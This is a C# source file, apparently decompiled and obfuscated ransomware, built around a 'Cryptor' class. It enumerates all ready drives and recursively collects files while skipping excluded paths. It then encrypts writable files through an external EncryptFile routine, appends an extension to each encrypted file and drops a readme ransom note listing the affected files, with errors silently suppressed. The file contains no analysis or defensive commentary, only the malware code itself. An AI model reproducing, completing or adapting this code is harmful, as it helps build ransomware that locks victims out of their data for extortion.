using System;
using System.Collections.Generic;
using System.IO;

namespace TimeTime;

public class Cryptor
{
	public static List<string> encr_files = new List<string>();

	public static void DropReadme(string path)
	{
		Settings.readmeText = Settings.readmeText.Replace(Class0.string_0, encr_files.Count.ToString() ?? Class0.string_1);
		string text = Class0.string_2;
		foreach (string encr_file in encr_files)
		{
			text = text + encr_file + Class0.string_3;
		}
		Settings.readmeText = Settings.readmeText.Replace(Class0.string_4, text);
		try
		{
			string directoryName = Path.GetDirectoryName(path);
			directoryName = directoryName + Class0.string_5 + Settings.readme_file_name;
			if (!File.Exists(directoryName))
			{
				File.WriteAllText(directoryName, Settings.readmeText);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void RenameAll()
	{
		foreach (string encr_file in encr_files)
		{
			if (File.Exists(encr_file))
			{
				try
				{
					File.Move(encr_file, encr_file + Settings.ext);
				}
				catch (Exception)
				{
				}
			}
		}
	}

	[_5D443F59("E3A7", "0d363d3d-9ccb-011b-c496-ab5029a52ab1")]
	public static extern void EncryptFile(string string_0);

	public static void EncryptDisks()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				if (driveInfo.IsReady && !driveInfo.Name.Contains(Class0.string_6))
				{
					TryEncryptFolder(driveInfo.Name);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	private static List<string> DirSearch(string sDir)
	{
		List<string> list = new List<string>();
		try
		{
			if (sDir.Contains(Class0.string_7))
			{
				return list;
			}
			if (sDir.Contains(Class0.string_8))
			{
				return list;
			}
			if (sDir.Contains(Class0.string_9))
			{
				return list;
			}
			if (sDir.Contains(Class0.string_10))
			{
				return list;
			}
			if (sDir.Contains(Class0.string_11))
			{
				return list;
			}
			if (sDir.Contains(Class0.string_12))
			{
				return list;
			}
			if (sDir.Contains(Class0.string_13))
			{
				return list;
			}
			if (sDir.Contains(Class0.string_14))
			{
				return list;
			}
			if (sDir.Contains(Class0.string_15))
			{
				return list;
			}
			string[] files = Directory.GetFiles(sDir);
			foreach (string item in files)
			{
				list.Add(item);
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				list.AddRange(DirSearch(sDir2));
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	public static void TryEncryptFolder(string folder)
	{
		try
		{
			EncryptFolder(folder);
		}
		catch (Exception)
		{
		}
	}

	public static void EncryptFolder(string folder)
	{
		List<string> list = DirSearch(folder);
		foreach (string item in list)
		{
			try
			{
				if (!item.EndsWith(Settings.ext))
				{
					bool flag = false;
					bool flag2 = false;
					bool flag3 = new FileInfo(item).Attributes.HasFlag(FileAttributes.ReadOnly);
					using (FileStream fileStream = new FileStream(item, FileMode.Open))
					{
						flag2 = fileStream.CanRead;
						flag = fileStream.CanWrite;
					}
					if (!flag3 && flag && flag2)
					{
						EncryptFile(item);
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	[_5D443F59("0F04", "6c61aaf4-1e64-064a-24ed-348eaff68026")]
	public static extern void DecryptFile(string string_0);
}
